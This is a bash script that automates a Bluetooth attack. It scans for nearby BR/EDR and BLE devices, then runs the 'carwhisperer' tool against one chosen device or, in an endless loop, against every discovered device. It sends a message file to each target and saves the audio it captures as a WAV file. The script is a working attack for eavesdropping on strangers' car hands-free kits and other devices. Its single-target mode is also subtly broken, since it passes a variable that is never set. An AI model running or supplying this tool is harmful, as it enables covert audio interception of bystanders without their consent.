#!/bin/bash

# Almost all logic for this script is just edited ble-deauth.sh logic

exec_path="carwhisperer"
message_file="message.raw"
output_raw="out.raw"
output_wav="out.wav"

rm -f /tmp/scan_br.txt /tmp/scan_le.txt /tmp/scan_br_f.txt /tmp/scan_le_f.txt > /dev/null

format_scan () {
        grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "$1" > "$2"
}


read -p "scan mode? (1: BR/EDR | 2: BLE | 3: ALL): " scan_mode

sudo systemctl restart bluetooth # Restarts the bluetooth service to avoid hcitool errors
sleep 2

if [ ${scan_mode} = "1" ]; then
        sudo stdbuf -oL hcitool -i "$INTERFACE_BT" scan | tee /tmp/scan_br.txt
        format_scan "/tmp/scan_br.txt" "/tmp/scan_br_f.txt"

elif [ ${scan_mode} = "2" ]; then
        echo "Press ctrl+c to stop scan"
        sudo stdbuf -oL hcitool -i "$INTERFACE_BT" lescan | tee /tmp/scan_le.txt
        format_scan "/tmp/scan_le.txt" "/tmp/scan_le_f.txt"

elif [ ${scan_mode} = "3" ]; then
        sudo stdbuf -oL hcitool -i "$INTERFACE_BT" scan | tee /tmp/scan_br.txt
        timeout 10 sudo stdbuf -oL hcitool -i "$INTERFACE_BT" lescan | tee /tmp/scan_le.txt
        format_scan "/tmp/scan_br.txt" "/tmp/scan_br_f.txt"
        format_scan "/tmp/scan_le.txt" "/tmp/scan_le_f.txt"
else
        echo "Enter a valid mode"
        exit 1
fi

read -p "attack mode? (1: Attack selected mac | 2: Attack all): " attack_mode


if [ ${attack_mode} = "1" ]; then
	rm -f "$output_raw"
	./$exec_path $INTERFACE_BT "$message_file" "$output_raw" "$bssid"
	sudo sox -t raw -r 8000 -c 1 -e signed-integer -b 16 --endian little "$output_raw" "$output_wav"
	echo "File saved to $output_wav"


elif [ ${attack_mode} = "2" ]; then
        echo "Press ctrl+z/ctrl+c to force-stop the attack"
        while true; do
                while IFS= read -r line; do # Reads an input from a file line-by-line
			rm -f "$output_raw"
                        echo "Now attacking: $line"
			./$exec_path $INTERFACE_BT "$message_file" "$output_raw" "$line"
			sudo sox -t raw -r 8000 -c 1 -e signed-integer -b 16 --endian little "$output_raw" "$output_wav"
        		echo "File saved to $output_wav"
                done < /tmp/scan_br_f.txt
                while IFS= read -r line; do # Do that a second time for LE
			rm -f "$output_raw"
                        echo "Now attacking: $line"
			./$exec_path $INTERFACE_BT "$message_file" "$output_raw" "$line"
			sudo sox -t raw -r 8000 -c 1 -e signed-integer -b 16 --endian little "$output_raw" "$output_wav"
        		echo "File saved to $output_wav"
                done < /tmp/scan_le_f.txt
        done
else
        echo "Enter a valid mode"
        exit 1
fi
